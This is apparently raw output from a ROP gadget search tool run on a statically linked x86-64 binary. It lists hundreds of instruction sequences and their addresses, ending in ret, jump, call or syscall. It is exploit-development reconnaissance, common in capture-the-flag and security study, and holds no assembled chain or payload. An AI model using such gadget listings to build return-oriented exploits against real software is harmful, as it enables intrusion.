0x00000000004a2c6e : add byte ptr [rax], al ; enter 4, 0 ; retf 4
0x00000000004a2e6e : add byte ptr [rax], al ; enter 5, 0 ; retf 5
0x00000000004a306e : add byte ptr [rax], al ; enter 6, 0 ; retf 6
0x00000000004a326e : add byte ptr [rax], al ; enter 7, 0 ; retf 7
0x00000000004a346e : add byte ptr [rax], al ; enter 8, 0 ; retf 8
0x00000000004a366e : add byte ptr [rax], al ; enter 9, 0 ; retf 9
0x00000000004b1736 : add byte ptr [rax], al ; fcomp qword ptr [rbp] ; add byte ptr [rcx + rdi*2 - 6], dl ; jmp rax
0x00000000004b5f32 : add byte ptr [rax], al ; fsub dword ptr [rbp - 0x60580000] ; std ; jmp qword ptr [rax]
0x00000000004b1e4e : add byte ptr [rax], al ; hlt ; add byte ptr fs:[rax], al ; jl 0x4b1e3d ; cli ; call qword ptr [rsi]
0x00000000004afb7a : add byte ptr [rax], al ; hlt ; jg 0x4afb7d ; call rsp
0x00000000004afb79 : add byte ptr [rax], al ; hlt ; jg 0x4afb7e ; call rsp
0x0000000000400a58 : add byte ptr [rax], al ; hlt ; nop dword ptr [rax + rax] ; ret
0x00000000004afc3e : add byte ptr [rax], al ; in al, 0x42 ; add byte ptr [rax], al ; in al, dx ; mov cl, bh ; jmp rbx
0x00000000004af846 : add byte ptr [rax], al ; in al, dx ; add byte ptr ds:[rax], al ; adc al, 0x9c ; clc ; jmp qword ptr [rsi]
0x00000000004afc42 : add byte ptr [rax], al ; in al, dx ; mov cl, bh ; jmp rbx
0x000000000048dd8b : add byte ptr [rax], al ; ja 0x48dd98 ; sbb eax, eax ; ret
0x00000000004131b6 : add byte ptr [rax], al ; je 0x4131c1 ; ret
0x0000000000424d50 : add byte ptr [rax], al ; je 0x424d1f ; ret
0x0000000000473d99 : add byte ptr [rax], al ; je 0x473da5 ; ret
0x000000000048d216 : add byte ptr [rax], al ; je 0x48d204 ; add rsp, 0x18 ; ret
0x000000000048d2a6 : add byte ptr [rax], al ; je 0x48d28a ; ret
0x000000000048d2e7 : add byte ptr [rax], al ; je 0x48d2f8 ; mov qword ptr [rdi + rsi*8], rdx ; ret
0x00000000004b045a : add byte ptr [rax], al ; je 0x4b040f ; stc ; call rsi
0x00000000004b0459 : add byte ptr [rax], al ; je 0x4b0410 ; stc ; call rsi
0x00000000004b0fd6 : add byte ptr [rax], al ; jl 0x4b1039 ; add byte ptr [rax], al ; add al, 9 ; cli ; jmp qword ptr [rdx]
0x00000000004b1e52 : add byte ptr [rax], al ; jl 0x4b1e39 ; cli ; call qword ptr [rsi]
0x00000000004b4212 : add byte ptr [rax], al ; jl 0x4b41e4 ; cld ; call rdx
0x00000000004851e3 : add byte ptr [rax], al ; jmp 0x401c34
0x000000000040f50f : add byte ptr [rax], al ; jmp 0x40f4d8
0x000000000040fc47 : add byte ptr [rax], al ; jmp 0x40fc10
0x0000000000449d01 : add byte ptr [rax], al ; jmp 0x449b93
0x0000000000485c88 : add byte ptr [rax], al ; jmp 0x485c52
0x000000000044afcb : add byte ptr [rax], al ; jmp rax
0x000000000041a87e : add byte ptr [rax], al ; jne 0x41a891 ; add rsp, 0x20 ; pop rbx ; ret
0x000000000042c942 : add byte ptr [rax], al ; jne 0x42c858 ; ret
0x00000000004490dd : add byte ptr [rax], al ; jne 0x44910d ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000449ec5 : add byte ptr [rax], al ; jne 0x449ee1 ; add rsp, 0x28 ; ret
0x000000000044a0f5 : add byte ptr [rax], al ; jne 0x44a143 ; add rsp, 0x58 ; ret
0x000000000044a485 : add byte ptr [rax], al ; jne 0x44a4db ; add rsp, 0x68 ; ret
0x000000000044adf4 : add byte ptr [rax], al ; jne 0x44ae0f ; add rsp, 0x28 ; ret
0x000000000045b56d : add byte ptr [rax], al ; jne 0x45b57e ; add rsp, 0x18 ; ret
0x00000000004758ca : add byte ptr [rax], al ; jne 0x47591b ; add rsp, 0x58 ; ret
0x00000000004759fc : add byte ptr [rax], al ; jne 0x475a23 ; add rsp, 0x38 ; ret
0x0000000000481da8 : add byte ptr [rax], al ; jne 0x481dbb ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000481ea3 : add byte ptr [rax], al ; jne 0x481edb ; add rsp, 0x38 ; ret
0x0000000000481f63 : add byte ptr [rax], al ; jne 0x481f96 ; add rsp, 0x68 ; ret
0x00000000004820c4 : add byte ptr [rax], al ; jne 0x482106 ; add rsp, 0x78 ; ret
0x0000000000482393 : add byte ptr [rax], al ; jne 0x4823c6 ; add rsp, 0x68 ; ret
0x00000000004843cf : add byte ptr [rax], al ; jne 0x484413 ; leave ; ret
0x000000000048505b : add byte ptr [rax], al ; jne 0x48506c ; add rsp, 0x38 ; ret
0x000000000048513e : add byte ptr [rax], al ; jne 0x48515c ; add rsp, 0x38 ; ret
0x0000000000487909 : add byte ptr [rax], al ; jne 0x487914 ; pop rbx ; ret
0x0000000000488499 : add byte ptr [rax], al ; jne 0x4884b4 ; add rsp, 0x38 ; ret
0x000000000048e1b2 : add byte ptr [rax], al ; jne 0x48e1d5 ; ret
0x00000000004af4ca : add byte ptr [rax], al ; jo 0x4af512 ; add byte ptr [rax], al ; add byte ptr [rax - 9], bl ; jmp qword ptr [rbx]
0x00000000004b03de : add byte ptr [rax], al ; jo 0x4b0392 ; stc ; jmp qword ptr [rcx]
0x00000000004b03dd : add byte ptr [rax], al ; jo 0x4b0393 ; stc ; jmp qword ptr [rcx]
0x00000000004b42de : add byte ptr [rax], al ; jo 0x4b42b3 ; cld ; jmp qword ptr [rsi]
0x00000000004b59ca : add byte ptr [rax], al ; jo 0x4b5977 ; add byte ptr [rax], al ; mov al, 0x83 ; std ; call qword ptr [rbx]
0x00000000004b1a46 : add byte ptr [rax], al ; js 0x4b19e9 ; cli ; call qword ptr [rcx]
0x00000000004b4ad2 : add byte ptr [rax], al ; js 0x4b4a70 ; add byte ptr [rax], al ; add al, 0xfd ; jmp rdx
0x00000000004456ae : add byte ptr [rax], al ; lea rax, [rdi + 0xa] ; ret
0x00000000004456be : add byte ptr [rax], al ; lea rax, [rdi + 0xb] ; ret
0x00000000004456ce : add byte ptr [rax], al ; lea rax, [rdi + 0xc] ; ret
0x00000000004456de : add byte ptr [rax], al ; lea rax, [rdi + 0xd] ; ret
0x00000000004456ee : add byte ptr [rax], al ; lea rax, [rdi + 0xe] ; ret
0x000000000044560d : add byte ptr [rax], al ; lea rax, [rdi + 0xf] ; ret
0x000000000044562e : add byte ptr [rax], al ; lea rax, [rdi + 1] ; ret
0x000000000044563e : add byte ptr [rax], al ; lea rax, [rdi + 2] ; ret
0x000000000044564e : add byte ptr [rax], al ; lea rax, [rdi + 3] ; ret
0x000000000044565e : add byte ptr [rax], al ; lea rax, [rdi + 4] ; ret
0x000000000044566e : add byte ptr [rax], al ; lea rax, [rdi + 5] ; ret
0x000000000044567e : add byte ptr [rax], al ; lea rax, [rdi + 6] ; ret
0x00000000004455ba : add byte ptr [rax], al ; lea rax, [rdi + 7] ; ret
0x000000000044568e : add byte ptr [rax], al ; lea rax, [rdi + 8] ; ret
0x000000000044569e : add byte ptr [rax], al ; lea rax, [rdi + 9] ; ret
0x000000000044561e : add byte ptr [rax], al ; lea rax, [rdi] ; ret
0x000000000044dcce : add byte ptr [rax], al ; lea rax, [rip + 0x26c629] ; ret
0x000000000046b8aa : add byte ptr [rax], al ; lea rsi, [rip + 0x24b56d] ; jmp rax
0x0000000000400caf : add byte ptr [rax], al ; leave ; ret
0x00000000004add06 : add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; and eax, dword ptr [rax] ; add byte ptr [rbx + rsi*4 - 0xa], dl ; call qword ptr [rdi]
0x00000000004af8ae : add byte ptr [rax], al ; loopne 0x4af8b1 ; clc ; call qword ptr [rax]
0x00000000004b420e : add byte ptr [rax], al ; mov ah, 0x88 ; add byte ptr [rax], al ; jl 0x4b41e8 ; cld ; call rdx
0x00000000004b49fe : add byte ptr [rax], al ; mov al, 0 ; std ; jmp qword ptr [rdx]
0x00000000004ab9ae : add byte ptr [rax], al ; mov al, 0x51 ; cmc ; call qword ptr [rbx]
0x00000000004b2e0a : add byte ptr [rax], al ; mov al, 0x74 ; add byte ptr [rax], al ; adc bl, bh ; sti ; jmp qword ptr [rbx]
0x00000000004b59ce : add byte ptr [rax], al ; mov al, 0x83 ; std ; call qword ptr [rbx]
0x00000000004b00ae : add byte ptr [rax], al ; mov al, 0x9d ; stc ; jmp qword ptr [rcx]
0x000000000044458e : add byte ptr [rax], al ; mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; lea rax, [rdx] ; ret
0x0000000000442dde : add byte ptr [rax], al ; mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x00000000004ab3a4 : add byte ptr [rax], al ; mov bl, dil ; std ; jmp rax
0x00000000004b2fa6 : add byte ptr [rax], al ; mov byte ptr [rbx], al ; cld ; jmp rdx
0x000000000041325e : add byte ptr [rax], al ; mov byte ptr [rdi], 0 ; mov rax, rdi ; ret
0x000000000044507e : add byte ptr [rax], al ; mov byte ptr [rdi], dh ; lea rax, [rdi] ; ret
0x0000000000444a5e : add byte ptr [rax], al ; mov byte ptr [rdi], dh ; ret
0x0000000000471aeb : add byte ptr [rax], al ; mov dword ptr [rbx + 0x74], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000419b1c : add byte ptr [rax], al ; mov dword ptr [rip + 0x29fce8], eax ; ret
0x0000000000403e0f : add byte ptr [rax], al ; mov dword ptr [rsp + 8], r10d ; call 0x420109
0x0000000000444a6e : add byte ptr [rax], al ; mov dx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x000000000042403e : add byte ptr [rax], al ; mov eax, 0x16 ; ret
0x000000000044af4e : add byte ptr [rax], al ; mov eax, 0x1c ; syscall
0x00000000004886ae : add byte ptr [rax], al ; mov eax, 0x26 ; syscall
0x000000000044a395 : add byte ptr [rax], al ; mov eax, 0x48 ; syscall
0x000000000047566e : add byte ptr [rax], al ; mov eax, 0x66 ; syscall
0x000000000047568e : add byte ptr [rax], al ; mov eax, 0x68 ; syscall
0x000000000047567e : add byte ptr [rax], al ; mov eax, 0x6b ; syscall
0x000000000047569e : add byte ptr [rax], al ; mov eax, 0x6c ; syscall
0x000000000044af1e : add byte ptr [rax], al ; mov eax, 0xa ; syscall
0x000000000044aeee : add byte ptr [rax], al ; mov eax, 0xb ; syscall
0x00000000004b0912 : add byte ptr [rax], al ; mov eax, 0xc800004f ; retf 0xfff9
0x000000000044c6d0 : add byte ptr [rax], al ; mov eax, 0xca ; syscall
0x000000000040dcae : add byte ptr [rax], al ; mov eax, 0xe ; syscall
0x0000000000449bd3 : add byte ptr [rax], al ; mov eax, 0xe5 ; syscall
0x00000000004b0c12 : add byte ptr [rax], al ; mov eax, 0xf000052 ; stc ; hlt ; jmp qword ptr [rbx]
0x0000000000412579 : add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x000000000048460b : add byte ptr [rax], al ; mov eax, 1 ; ret
0x000000000044a2ae : add byte ptr [rax], al ; mov eax, 1 ; syscall
0x0000000000484814 : add byte ptr [rax], al ; mov eax, 2 ; ret
0x0000000000418c3e : add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x10] ; sub eax, dword ptr [rsi + 0x10] ; ret
0x000000000048f62e : add byte ptr [rax], al ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x48f649 ; ret
0x000000000048f85e : add byte ptr [rax], al ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x48f879 ; ret
0x000000000040dc79 : add byte ptr [rax], al ; mov eax, ecx ; syscall
0x000000000047e79f : add byte ptr [rax], al ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00000000004688f2 : add byte ptr [rax], al ; mov eax, edx ; pop rbx ; ret
0x0000000000466091 : add byte ptr [rax], al ; mov eax, edx ; ret
0x00000000004b09b2 : add byte ptr [rax], al ; mov ebx, ss ; stc ; jmp qword ptr [rdx]
0x0000000000444a9e : add byte ptr [rax], al ; mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; ret
0x000000000048d014 : add byte ptr [rax], al ; mov edi, 1 ; call r14
0x000000000048d03c : add byte ptr [rax], al ; mov edi, 1 ; call rax
0x000000000044992e : add byte ptr [rax], al ; mov edi, edx ; mov eax, esi ; syscall
0x000000000043593e : add byte ptr [rax], al ; mov edx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043605e : add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x000000000044c786 : add byte ptr [rax], al ; mov esi, 0x80 ; syscall
0x000000000044c93e : add byte ptr [rax], al ; mov qword ptr [rax + 0x20], rsi ; ret
0x0000000000484fd8 : add byte ptr [rax], al ; mov qword ptr [rax], rdx ; pop rbx ; ret
0x0000000000481d20 : add byte ptr [rax], al ; mov qword ptr [rbx + 0x18], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x0000000000488512 : add byte ptr [rax], al ; mov qword ptr [rbx + 0x18], rax ; pop rbx ; ret
0x00000000004885e6 : add byte ptr [rax], al ; mov qword ptr [rbx + 0x20], rax ; pop rbx ; ret
0x000000000047b764 : add byte ptr [rax], al ; mov qword ptr [rdi + 0x308], rax ; ret
0x000000000048d33e : add byte ptr [rax], al ; mov qword ptr [rdi + 0x98], rsi ; ret
0x0000000000484628 : add byte ptr [rax], al ; mov qword ptr [rdi], rsi ; ret
0x0000000000419adc : add byte ptr [rax], al ; mov qword ptr [rip + 0x29fd03], rax ; ret
0x0000000000419abc : add byte ptr [rax], al ; mov qword ptr [rip + 0x29fd1b], rax ; ret
0x00000000004018b0 : add byte ptr [rax], al ; mov qword ptr [rsi + 0x10], rsi ; syscall
0x00000000004181ce : add byte ptr [rax], al ; mov rax, -1 ; ret
0x000000000045b61e : add byte ptr [rax], al ; mov rax, 0xf ; syscall
0x000000000047499e : add byte ptr [rax], al ; mov rax, 1 ; ret
0x00000000004749ae : add byte ptr [rax], al ; mov rax, 2 ; ret
0x00000000004749be : add byte ptr [rax], al ; mov rax, 3 ; ret
0x00000000004749ce : add byte ptr [rax], al ; mov rax, 4 ; ret
0x00000000004749de : add byte ptr [rax], al ; mov rax, 5 ; ret
0x00000000004749ee : add byte ptr [rax], al ; mov rax, 6 ; ret
0x00000000004749fe : add byte ptr [rax], al ; mov rax, 7 ; ret
0x000000000047cd33 : add byte ptr [rax], al ; mov rax, qword ptr [r15 + 0x10] ; add rax, qword ptr [r14] ; call rax
0x00000000004120ce : add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x0000000000481bde : add byte ptr [rax], al ; mov rax, qword ptr [rax + 8] ; ret
0x000000000047c54e : add byte ptr [rax], al ; mov rax, qword ptr [rbx + 0x10] ; add rax, qword ptr [r14] ; call rax
0x0000000000471fee : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x48] ; mov eax, dword ptr [rax + 0x4c] ; ret
0x0000000000418f8e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x68] ; ret
0x000000000048d2be : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x90] ; ret
0x000000000048d34e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0xa0] ; ret
0x000000000048d3ae : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0xa8] ; ret
0x000000000048d39e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0xb0] ; ret
0x000000000048d35e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0xb8] ; ret
0x00000000004582ce : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x263ba1] ; ret
0x000000000044fdde : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x26cb51] ; ret
0x0000000000418f6e : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x2a01a9] ; ret
0x000000000048b08e : add byte ptr [rax], al ; mov rax, qword ptr [rsi + 0xa8] ; ret
0x0000000000473bbe : add byte ptr [rax], al ; mov rax, r8 ; vzeroupper ; ret
0x0000000000414644 : add byte ptr [rax], al ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048d4b8 : add byte ptr [rax], al ; mov rax, rbp ; pop rbx ; pop rbp ; ret
0x0000000000414fc2 : add byte ptr [rax], al ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000418f9e : add byte ptr [rax], al ; mov rax, rdi ; ret
0x000000000041e56e : add byte ptr [rax], al ; mov rax, rsi ; ret
0x000000000047fb9a : add byte ptr [rax], al ; mov rbx, rsp ; mov rsi, rbx ; syscall
0x000000000044785f : add byte ptr [rax], al ; mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000044bc29 : add byte ptr [rax], al ; mov rdi, qword ptr [r13] ; call r12
0x000000000040eab1 : add byte ptr [rax], al ; mov rdi, qword ptr [rax + 0x20] ; call rdx
0x000000000049218e : add byte ptr [rax], al ; mov rdi, r13 ; call rax
0x00000000004918ee : add byte ptr [rax], al ; mov rdi, r15 ; call rax
0x000000000046f04f : add byte ptr [rax], al ; mov rdi, rbx ; call rax
0x0000000000435e9e : add byte ptr [rax], al ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x0000000000456cb7 : add byte ptr [rax], al ; mov rdx, rax ; jmp 0x456c74
0x0000000000420bb6 : add byte ptr [rax], al ; mov rsi, qword ptr [rsp + 0x68] ; call rax
0x000000000048dd2e : add byte ptr [rax], al ; mov rsi, r14 ; mov rdi, r12 ; call r15
0x0000000000423e1e : add byte ptr [rax], al ; mov rsi, rbp ; mov rdi, rax ; call rcx
0x00000000004b22e6 : add byte ptr [rax], al ; mov word ptr [rcx], gs ; add byte ptr [rdx + rdx*4 - 5], dl ; jmp qword ptr [rax]
0x000000000048105e : add byte ptr [rax], al ; movsx eax, dl ; sub eax, ecx ; ret
0x000000000048b145 : add byte ptr [rax], al ; movsxd rax, dword ptr [r15 + rax*4] ; add rax, r15 ; jmp rax
0x000000000046f204 : add byte ptr [rax], al ; movsxd rax, dword ptr [rdi + rax*4] ; add rax, rdi ; jmp rax
0x000000000045ac5d : add byte ptr [rax], al ; movsxd rdi, dword ptr [r11 + rsi*4] ; add rdi, r11 ; jmp rdi
0x000000000045a75e : add byte ptr [rax], al ; movsxd rsi, dword ptr [r8 + r9*4] ; add rsi, r8 ; jmp rsi
0x000000000041351e : add byte ptr [rax], al ; movzx eax, byte ptr [rdx] ; ret
0x0000000000448a4e : add byte ptr [rax], al ; movzx eax, cl ; pop rbx ; ret
0x0000000000435ace : add byte ptr [rax], al ; movzx edx, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x00000000004361ae : add byte ptr [rax], al ; movzx edx, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x000000000043613e : add byte ptr [rax], al ; movzx edx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x00000000004b2fea : add byte ptr [rax], al ; nop ; jbe 0x4b2ff8 ; add byte ptr [rax], ah ; or bh, ah ; jmp qword ptr [rax]
0x0000000000400bcd : add byte ptr [rax], al ; nop ; leave ; ret
0x000000000048541c : add byte ptr [rax], al ; nop ; mov eax, 0x27 ; syscall
0x000000000044c61c : add byte ptr [rax], al ; nop ; mov eax, 0x63 ; syscall
0x0000000000474f0c : add byte ptr [rax], al ; nop ; mov eax, 0xc9 ; syscall
0x000000000044c859 : add byte ptr [rax], al ; nop dword ptr [rax + rax] ; ret
0x00000000004ac39a : add byte ptr [rax], al ; or al, byte ptr [rax] ; add byte ptr [rax], ah ; sub dh, dh ; jmp qword ptr [rax]
0x00000000004b42da : add byte ptr [rax], al ; or byte ptr [rcx - 0x33900000], 0xfc ; jmp qword ptr [rsi]
0x00000000004b03da : add byte ptr [rax], al ; or byte ptr [rdx], 0 ; jo 0x4b0396 ; stc ; jmp qword ptr [rcx]
0x00000000004abe62 : add byte ptr [rax], al ; or byte ptr [rip - 0x6d380000], al ; cmc ; call qword ptr [rdx]
0x00000000004b119e : add byte ptr [rax], al ; pop rax ; add byte ptr [rax], al ; pop rsp ; sbb al, 0xfa ; call rcx
0x00000000004b03c6 : add byte ptr [rax], al ; pop rax ; stosd dword ptr [rdi], eax ; stc ; jmp qword ptr [rcx]
0x000000000044afde : add byte ptr [rax], al ; pop rbp ; pop r12 ; jmp rax
0x0000000000400a96 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000046603b : add byte ptr [rax], al ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x000000000045842a : add byte ptr [rax], al ; pop rbx ; pop r12 ; ret
0x0000000000414af3 : add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000417aa5 : add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041059a : add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x0000000000400e86 : add byte ptr [rax], al ; pop rbx ; ret
0x00000000004b16b6 : add byte ptr [rax], al ; pop rsp ; pop rbp ; add byte ptr [rax], al ; and al, 0x79 ; cli ; call qword ptr [rdx]
0x00000000004b4522 : add byte ptr [rax], al ; pop rsp ; retf
0x00000000004b11a2 : add byte ptr [rax], al ; pop rsp ; sbb al, 0xfa ; call rcx
0x00000000004b0c16 : add byte ptr [rax], al ; psubw mm6, mm4 ; jmp qword ptr [rbx]
0x00000000004967b6 : add byte ptr [rax], al ; push 0x1efffb76 ; jns 0x4967c3 ; jmp rsi
0x00000000004af9c2 : add byte ptr [rax], al ; push 0x38000040 ; stc ; jmp qword ptr [rbx]
0x00000000004b03c2 : add byte ptr [rax], al ; push 0x5800004a ; stosd dword ptr [rdi], eax ; stc ; jmp qword ptr [rcx]
0x00000000004af6c2 : add byte ptr [rax], al ; push 0x7800003d ; sal bh, 1 ; call rsp
0x00000000004941fe : add byte ptr [rax], al ; push rax ; adc cl, bh ; call qword ptr [rax - 0x2f0006ef]
0x00000000004b00aa : add byte ptr [rax], al ; push rax ; add byte ptr [r8], r8b ; mov al, 0x9d ; stc ; jmp qword ptr [rcx]
0x00000000004b03aa : add byte ptr [rax], al ; push rax ; add byte ptr [rax], al ; stosd dword ptr [rdi], eax ; stc ; jmp qword ptr [rcx]
0x00000000004001ba : add byte ptr [rax], al ; push rbp ; add byte ptr [rsi], dh ; xor edi, ebp ; retf 0x6500
0x00000000004b173a : add byte ptr [rax], al ; push rsp ; jns 0x4b173e ; jmp rax
0x00000000004add0a : add byte ptr [rax], al ; push rsp ; mov bl, 0xf6 ; call qword ptr [rdi]
0x00000000004b09ae : add byte ptr [rax], al ; push rsp ; push rax ; add byte ptr [rax], al ; mov ebx, ss ; stc ; jmp qword ptr [rdx]
0x00000000004b22ea : add byte ptr [rax], al ; push rsp ; xchg eax, edx ; sti ; jmp qword ptr [rax]
0x00000000004b0e1a : add byte ptr [rax], al ; rcl byte ptr [rax + rax], 0xa0 ; clc ; std ; jmp qword ptr [rdx]
0x0000000000400a5e : add byte ptr [rax], al ; ret
0x0000000000498646 : add byte ptr [rax], al ; ret 0
0x000000000049f5be : add byte ptr [rax], al ; ret 0x10
0x00000000004a128e : add byte ptr [rax], al ; ret 0x1d4
0x00000000004a1a26 : add byte ptr [rax], al ; ret 0x1d5
0x00000000004a0296 : add byte ptr [rax], al ; ret 0x24
0x00000000004a0786 : add byte ptr [rax], al ; ret 0x33
0x000000000049edbe : add byte ptr [rax], al ; ret 0xa
0x000000000049f1be : add byte ptr [rax], al ; ret 0xd
0x00000000004a2662 : add byte ptr [rax], al ; ret 1
0x00000000004a2862 : add byte ptr [rax], al ; ret 2
0x00000000004a2a62 : add byte ptr [rax], al ; ret 3
0x00000000004a2c62 : add byte ptr [rax], al ; ret 4
0x00000000004a2e62 : add byte ptr [rax], al ; ret 5
0x000000000049e966 : add byte ptr [rax], al ; ret 6
0x00000000004a3262 : add byte ptr [rax], al ; ret 7
0x00000000004a3462 : add byte ptr [rax], al ; ret 8
0x00000000004a3662 : add byte ptr [rax], al ; ret 9
0x000000000049866a : add byte ptr [rax], al ; retf
0x0000000000498666 : add byte ptr [rax], al ; retf 0
0x000000000049f71e : add byte ptr [rax], al ; retf 0x11
0x00000000004a12c6 : add byte ptr [rax], al ; retf 0x1d4
0x00000000004a1a66 : add byte ptr [rax], al ; retf 0x1d5
0x00000000004a02d6 : add byte ptr [rax], al ; retf 0x24
0x00000000004a07c6 : add byte ptr [rax], al ; retf 0x33
0x000000000049ef1e : add byte ptr [rax], al ; retf 0xb
0x000000000049f31e : add byte ptr [rax], al ; retf 0xe
0x00000000004b3e7e : add byte ptr [rax], al ; retf 0xf4c6
0x000000000049f93e : add byte ptr [rax], al ; retf 1
0x00000000004a2872 : add byte ptr [rax], al ; retf 2
0x00000000004a2a72 : add byte ptr [rax], al ; retf 3
0x000000000049e7c6 : add byte ptr [rax], al ; retf 4
0x00000000004a2e72 : add byte ptr [rax], al ; retf 5
0x00000000004a3072 : add byte ptr [rax], al ; retf 6
0x00000000004a3272 : add byte ptr [rax], al ; retf 7
0x00000000004a3472 : add byte ptr [rax], al ; retf 8
0x00000000004a3672 : add byte ptr [rax], al ; retf 9
0x00000000004a2c5e : add byte ptr [rax], al ; rol byte ptr [rax + rax], 0 ; ret 4
0x00000000004afc2a : add byte ptr [rax], al ; rol byte ptr [rdx], 1 ; add al, dh ; mov cl, bh ; call qword ptr [rax]
0x000000000049f066 : add byte ptr [rax], al ; ror byte ptr [rax + rax], 0 ; ret
0x00000000004afb76 : add byte ptr [rax], al ; sbb al, 0x42 ; add byte ptr [rax], al ; hlt ; jg 0x4afb81 ; call rsp
0x00000000004b478e : add byte ptr [rax], al ; shr al, 1 ; cld ; jmp qword ptr [rcx]
0x000000000041f5ec : add byte ptr [rax], al ; shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; pop rbx ; ret
0x00000000004b1bf6 : add byte ptr [rax], al ; std ; call rdx
0x00000000004b03ae : add byte ptr [rax], al ; stosd dword ptr [rdi], eax ; stc ; jmp qword ptr [rcx]
0x00000000004b0a96 : add byte ptr [rax], al ; sub al, ah ; stc ; call qword ptr [rax]
0x00000000004ac45e : add byte ptr [rax], al ; sub byte ptr [rdx], 0xf6 ; call qword ptr [rax]
0x000000000042d88c : add byte ptr [rax], al ; sub eax, ecx ; ret
0x0000000000418316 : add byte ptr [rax], al ; sub r8, rcx ; lea eax, [r8 - 1] ; ret
0x00000000004473a1 : add byte ptr [rax], al ; sub rax, rdx ; ret
0x000000000047b6bd : add byte ptr [rax], al ; syscall
0x00000000004b1236 : add byte ptr [rax], al ; test al, 0x25 ; cli ; call qword ptr [rdi]
0x00000000004b3402 : add byte ptr [rax], al ; test al, 0x7a ; add byte ptr [rax], al ; cmp byte ptr [rdx], ah ; cld ; jmp qword ptr [rcx]
0x00000000004b5f36 : add byte ptr [rax], al ; test al, 0x9f ; std ; jmp qword ptr [rax]
0x00000000004abf02 : add byte ptr [rax], al ; test al, 5 ; add byte ptr [rax], al ; clc ; cwde ; cmc ; call rax
0x000000000044c579 : add byte ptr [rax], al ; test eax, eax ; cmove eax, edx ; ret
0x0000000000400409 : add byte ptr [rax], al ; test rax, rax ; je 0x400419 ; call rax
0x000000000042c18e : add byte ptr [rax], al ; vzeroupper ; xor eax, eax ; ret
0x00000000004ad4da : add byte ptr [rax], al ; xor al, 0x93 ; idiv bh ; retf
0x00000000004b198a : add byte ptr [rax], al ; xor byte ptr [rax], ah ; add byte ptr [rax], dh ; xchg eax, ebp ; cli ; call qword ptr [rdx]
0x00000000004b318a : add byte ptr [rax], al ; xor byte ptr [rax], bh ; add byte ptr [rax], al ; adc edi, esp ; jmp qword ptr [rax]
0x00000000004af58e : add byte ptr [rax], al ; xor byte ptr [rbx - 9], bl ; jmp qword ptr [rbx]
0x00000000004b478a : add byte ptr [rax], al ; xor byte ptr [rsi - 0x17300000], cl ; cld ; jmp qword ptr [rcx]
0x00000000004a4f3e : add byte ptr [rax], al ; xor eax, dword ptr [rsi + 0x7368fffd] ; std ; jmp qword ptr [rax]
0x000000000045d2b7 : add byte ptr [rax], al ; xor eax, eax ; add rsp, 8 ; ret
0x0000000000475e26 : add byte ptr [rax], al ; xor eax, eax ; leave ; ret
0x000000000040ed93 : add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048d4c5 : add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x000000000040f406 : add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000044a1de : add byte ptr [rax], al ; xor eax, eax ; syscall
0x000000000042c0da : add byte ptr [rax], al ; xor eax, eax ; vzeroupper ; ret
0x000000000044acba : add byte ptr [rax], al ; xor edi, edi ; syscall
0x00000000004581f6 : add byte ptr [rax], al ; xor r9d, r9d ; call r15
0x000000000044545e : add byte ptr [rax], al ; xor rax, rax ; ret
0x00000000004b3407 : add byte ptr [rax], bh ; and bh, ah ; jmp qword ptr [rcx]
0x00000000004b0a93 : add byte ptr [rax], bh ; push rcx ; add byte ptr [rax], al ; sub al, ah ; stc ; call qword ptr [rax]
0x0000000000480f9e : add byte ptr [rax], bh ; retf 0x850f
0x00000000004af9c7 : add byte ptr [rax], bh ; stc ; jmp qword ptr [rbx]
0x0000000000494a10 : add byte ptr [rax], bl ; cli ; call qword ptr [rax + 0x20fffa17]
0x00000000004af837 : add byte ptr [rax], bl ; pushfq ; clc ; call qword ptr [rax]
0x00000000004b0a97 : add byte ptr [rax], ch ; loopne 0x4b0a98 ; call qword ptr [rax]
